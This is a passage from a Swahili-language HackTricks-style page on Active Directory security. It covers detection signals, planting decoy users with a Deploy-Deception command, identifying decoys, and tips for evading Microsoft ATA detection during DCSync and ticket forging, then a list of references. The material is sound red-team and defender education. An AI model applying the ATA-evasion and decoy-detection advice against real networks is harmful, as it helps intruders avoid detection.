- Baadhi ya signals hizi zinahitaji traffic iliyodecryptiwa, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, au service-side visibility
- Zithibitishe dhidi ya Samba/Linux clients, appliances, na legacy software kabla ya kuzigeuza kuwa alerts
- Pandisha detections kutoka enrichment -> hunting -> alerting unapoendelea kujenga uaminifu kwenye baseline

### **Implementing Deception Techniques**

- Implementing deception huhusisha kuweka traps, kama decoy users au computers, zenye features kama passwords ambazo hazi-expire au zilizowekwa alama kuwa Trusted for Delegation. Njia ya kina inajumuisha kuunda users wenye rights maalum au kuwaongeza kwenye high privilege groups.<sup>[[2]](#references)</sup>
- Mfano wa vitendo unahusisha kutumia tools kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Maelezo zaidi kuhusu deploying deception techniques yanapatikana kwenye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Kwa User Objects**: Viashiria vya kutiliwa shaka vinajumuisha ObjectSID isiyo ya kawaida, logons zisizo za mara kwa mara, creation dates, na bad password counts zilizo chini.
- **General Indicators**: Kulinganisha attributes za potential decoy objects na zile za genuine objects kunaweza kufichua inconsistencies. Tools kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua deceptions kama hizi.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Kuepuka session enumeration kwenye Domain Controllers ili kuzuia ATA detection.
- **Ticket Impersonation**: Kutumia **aes** keys kwa ticket creation husaidia kukwepa detection kwa kutodowngrade hadi NTLM.
- **DCSync Attacks**: Inashauriwa kutekeleza kutoka kwa non-Domain Controller ili kuepuka ATA detection, kwa sababu execution ya moja kwa moja kutoka kwa Domain Controller itasababisha alerts.

## References

- [1] [A Guide to Attacking Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forging Trusts for Deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [From Domain Admin to Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [A journey into forgotten Null Session and MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

{{#include ../../banners/hacktricks-training.md}}
